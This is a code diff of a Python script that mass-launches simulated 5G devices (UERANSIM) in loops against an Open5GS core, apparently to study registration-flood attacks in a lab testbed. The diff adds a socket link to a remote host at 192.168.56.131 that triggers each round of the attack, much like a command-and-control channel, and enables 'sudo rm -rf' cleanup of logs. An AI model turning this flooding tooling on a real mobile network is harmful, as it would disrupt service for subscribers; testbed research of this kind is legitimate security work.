@@ -6,6 +6,7 @@ import subprocess
 import os
 import argparse
 import multiprocessing
+import socket
 
 def create_copies(start_supi, attack_type, no_of_ue): 
     """
@@ -44,8 +45,7 @@ def create_copies(start_supi, attack_type, no_of_ue):
 def run_attack_one_or_two(path, delay_bw, repeat):
     """ This is teh implementation for the attack type one or two. We are running the UEs in a loop if repeat is enabled.
     """
-    
-    
+
     ue_number = ((path.split('/')[-1]).split('.')[0]).split('-')[-1]
     imsi = "imsi-" + str(999700000000000 + int(ue_number)+1)
     command = "/home/vagrant/UERANSIM/build/nr-ue -c " + path + "> .logs/" + imsi +  ".log &"
@@ -54,9 +54,6 @@ def run_attack_one_or_two(path, delay_bw, repeat):
         while 1:
             subprocess.run(command, shell=True, check=True)
             time.sleep(delay_bw)
-            # This should be a parameter~!!!!             
-            # subprocess.run("/home/vagrant/UERANSIM/build/nr-cli " + imsi + " --exec 'deregister switch-off' > .logs/"+ imsi +  "_off.log", shell=True, check=True)
-            # time.sleep(0.1)
             proc2 = subprocess.Popen("ps -ef | grep '/home/vagrant/UERANSIM/build/nr-ue -c "+ path+ "' | grep -v 'grep' | awk '{ printf $2 }'",shell=True,stdout=subprocess.PIPE)
             pids=""
             for c in iter(lambda:proc2.stdout.read(1),b""):
@@ -68,7 +65,6 @@ def run_attack_one_or_two(path, delay_bw, repeat):
         subprocess.run(command, shell=True, check=True)
         time.sleep(delay_bw)
         return 1
-
 
 if __name__ == "__main__": 
     """
@@ -115,21 +111,37 @@ if __name__ == "__main__":
     pool = multiprocessing.Pool(processes=proc_count)
     arguments = [(command, attack_type, repeat) for command in commands]
 
-    try: 
-        results = pool.starmap_async(run_attack_one_or_two, arguments)
-        # Wait for the specified timeout
-        results.get(timeout=timeout)
-    except multiprocessing.TimeoutError:
-        # Timeout occurred, terminate the pool
-        pool.terminate()
-        pool.join()
-        print("Program terminated after", timeout , "seconds.")
-    else:
-        pool.close()
-        pool.join()
-        print("Program completed successfully.")
+    ## Modeling a sophisticated attacker 
+    s = socket.socket()
+    # Define the port on which you want to connect
+    addr = "192.168.56.131"
+    port = 12345
+    s.settimeout(2)
+
+    # connect to the server on local computer
+    s.connect((addr, port))
+    
+    x = s.recv(1024)
+    while x:
+
+        try: 
+            results = pool.starmap_async(run_attack_one_or_two, arguments)
+            # Wait for the specified timeout
+            results.get(timeout=timeout)
+        except multiprocessing.TimeoutError:
+            # Timeout occurred, terminate the pool
+            pool.terminate()
+            pool.join()
+            print("Program terminated after", timeout , "seconds.")
+        else:
+            pool.close()
+            pool.join()
+            print("Program completed successfully.")
+        
+        x = s.recv(1024)        
 
     # Cleaning up the files
-    # os.system("sudo rm -rf .logs/*")
+    os.system("sudo rm -rf .logs/*")
     os.system("sudo rm -rf UERANSIM/config/m-open5gs-ue-*")
     os.system("sudo pkill nr-ue")
+    s.close()
